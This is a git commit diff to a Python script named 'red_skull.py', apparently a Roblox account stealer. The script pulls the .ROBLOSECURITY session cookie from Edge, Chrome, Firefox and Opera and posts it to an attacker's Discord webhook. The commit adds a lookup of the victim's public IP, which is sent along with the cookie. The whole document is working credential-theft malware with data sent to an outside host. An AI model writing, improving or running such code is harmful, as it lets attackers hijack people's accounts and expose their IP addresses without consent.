b7a183528c82d71bd0757e5a22fb76f7280e2405
Krn0s <99499638+Krn0s@users.noreply.github.com>
2023-03-02 20:41:20 +0100

    Update red_skull.py

--- red_skull.py
+++ red_skull.py
@@ -2,38 +2,42 @@ import browser_cookie3
 import requests 
 import threading
 
+
 WebHook = "" # Input your webhook here
 
 
-
 def MicrosoftEdge():
+    
     try:
-        cookies = browser_cookie3.edge(domain_name = "roblox.com")
+        cookies = browser_cookie3.chrome(domain_name = "roblox.com")
         cookies = str(cookies)
         cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
+        ip_address = requests.get("https://api.ipify.org/").text
         requests.post(WebHook, json = {
             "username" : "RED SKULL|COOK'ER",
             "avatar_url" : "https://cdn.discordapp.com/attachments/1071405002570092577/1072887295465771008/skull.png", 
             "embeds": [{
-            "title": "COOKIE FOUND|Browser : Edge", 
-            "description": f"```{cookie}```", 
-            "color": 16711680,
-                "thumbnail":{
-                    "url": "https://tr.rbxcdn.com/13d613f1ff673320102c37a26d12c234/150/150/AvatarHeadshot/Png"
-                },
+                "title": "COOKIE FOUND|Browser : Edge", 
+                "description": f"```{cookie}```", 
+                "color": 16711680,
+                "fields": [
+                    {"name" : "Victim's IP", "value" : ip_address, "inline:": True}
+                ],
                 "footer": {
         "text": "Krn0s@github",
         "icon_url": "https://avatars.githubusercontent.com/u/99499638?v=4"
-      }
-        }]})
+      }               
+}]})
     except:
         pass
+        
 
 def GoogleChrome():
     try:
         cookies = browser_cookie3.chrome(domain_name = "roblox.com")
         cookies = str(cookies)
         cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
+        ip_address = requests.get("https://api.ipify.org/").text
         requests.post(WebHook, json = {
             "username" : "RED SKULL|COOK'ER",
             "avatar_url" : "https://cdn.discordapp.com/attachments/1071405002570092577/1072887295465771008/skull.png", 
@@ -41,16 +45,14 @@ def GoogleChrome():
                 "title": "COOKIE FOUND|Browser : Chrome", 
                 "description": f"```{cookie}```", 
                 "color": 16711680,
-                "thumbnail":{
-                    "url": "https://tr.rbxcdn.com/13d613f1ff673320102c37a26d12c234/150/150/AvatarHeadshot/Png"
-                },
+                "fields": [
+                    {"name" : "Victim's IP", "value" : ip_address, "inline:": True}
+                ],
                 "footer": {
         "text": "Krn0s@github",
         "icon_url": "https://avatars.githubusercontent.com/u/99499638?v=4"
-      }
-                
-                }]})
-
+      }               
+}]})
     except:
         pass
 
@@ -59,6 +61,7 @@ def MozillaFirefox():
         cookies = browser_cookie3.firefox(domain_name = "roblox.com")
         cookies = str(cookies)
         cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
+        ip_address = requests.get("https://api.ipify.org/").text
         requests.post(WebHook, json = {
             "username" : "RED SKULL|COOK'ER",
             "avatar_url" : "https://cdn.discordapp.com/attachments/1071405002570092577/1072887295465771008/skull.png", 
@@ -66,15 +69,14 @@ def MozillaFirefox():
                 "title": "COOKIE FOUND|Browser : Firefox", 
                 "description": f"```{cookie}```", 
                 "color": 16711680,
-                "thumbnail":{
-                    "url": "https://tr.rbxcdn.com/13d613f1ff673320102c37a26d12c234/150/150/AvatarHeadshot/Png"
-                },
+                "fields": [
+                    {"name" : "Victim's IP", "value" : ip_address, "inline:": True}
+                ],
                 "footer": {
         "text": "Krn0s@github",
         "icon_url": "https://avatars.githubusercontent.com/u/99499638?v=4"
-      }
-
-                }]})
+      }               
+}]})
     except:
         pass
 
@@ -83,22 +85,22 @@ def Opera():
         cookies = browser_cookie3.opera(domain_name = "roblox.com")
         cookies = str(cookies)
         cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
+        ip_address = requests.get("https://api.ipify.org/").text
         requests.post(WebHook, json = {
             "username" : "RED SKULL|COOK'ER",
-            "avatar_url" : "https://cdn.discordapp.com/attachments/1071405002570092577/1072887295465771008/skull.png",
+            "avatar_url" : "https://cdn.discordapp.com/attachments/1071405002570092577/1072887295465771008/skull.png", 
             "embeds": [{
-                "title": "COOKIE FOUND|Browser : Opera",
-                "description": f"```{cookie}```",
+                "title": "COOKIE FOUND|Browser : Opera", 
+                "description": f"```{cookie}```", 
                 "color": 16711680,
-                "thumbnail":{
-                    "url": "https://tr.rbxcdn.com/13d613f1ff673320102c37a26d12c234/150/150/AvatarHeadshot/Png"
-                },
+                "fields": [
+                    {"name" : "Victim's IP", "value" : ip_address, "inline:": True}
+                ],
                 "footer": {
         "text": "Krn0s@github",
         "icon_url": "https://avatars.githubusercontent.com/u/99499638?v=4"
-      }
-
-                }]})
+      }               
+}]})
     except:
         pass
 
@@ -106,3 +108,4 @@ browsers = [MicrosoftEdge, GoogleChrome, MozillaFirefox, Opera]
 
 for v in browsers:
     threading.Thread(target = v).start()
+
